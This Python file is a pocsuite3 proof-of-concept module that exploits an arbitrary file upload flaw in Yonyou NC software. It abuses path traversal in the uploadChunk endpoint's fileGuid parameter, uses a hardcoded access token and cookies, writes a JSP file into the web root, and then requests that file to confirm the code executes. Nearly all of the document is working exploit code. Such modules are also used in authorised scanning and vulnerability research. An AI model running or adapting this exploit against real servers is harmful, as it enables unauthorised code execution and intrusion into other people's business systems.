# _*_ coding:utf-8 _*_
# @Time : 2023/12/10
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class yongyouNC_upload(POCBase):
    pocDesc = '''用友NC任意文件上传漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2023-12-10'
    name = '用友NC任意文件上传漏洞'



    def _verify(self):

        result = {}
        url = self.url+ '/ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1'
        check_path = self.url+ "/nccloud/ncchr_log.jsp"
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0",
            "Accept": "image/avif,image/webp,*/*",
            'Accept-Encoding': 'gzip, deflate',
            'Cookie': 'route=4477e7ff55d052377a1d707534723e86; JSESSIONID=1E07FDA2A72BA221F0B1DB2D51E0382D',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1',
            'Content-Length': '174',
            "Content-Type": "multipart/form-data; boundary=bd966ad8118cfcc67ee341272f2900c4",
            'accessTokenNcc': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ'
        }
        headers2 = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0",
            'Upgrade-Insecure-Requests': '1',
            'Cookie': 'route=4477e7ff55d052377a1d707534723e86; JSESSIONID=1E07FDA2A72BA221F0B1DB2D51E0382D'
        }
        path = "/ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1"
        try:
            data ='--bd966ad8118cfcc67ee341272f2900c4\r\nContent-Disposition: form-data; name="file"; filename="ncchr_log.jsp"\r\n\r\n<%out.println("12345678");%>\r\n--bd966ad8118cfcc67ee341272f2900c4--'


            response = requests.post(url, headers=headers, data=data, verify=False)
            if response.status_code == 200:
                check_response = requests.get(check_path,headers=headers2,verify=False)
                if check_response.status_code == 200 and '12345678' in check_response.text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['path'] = path

            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(yongyouNC_upload)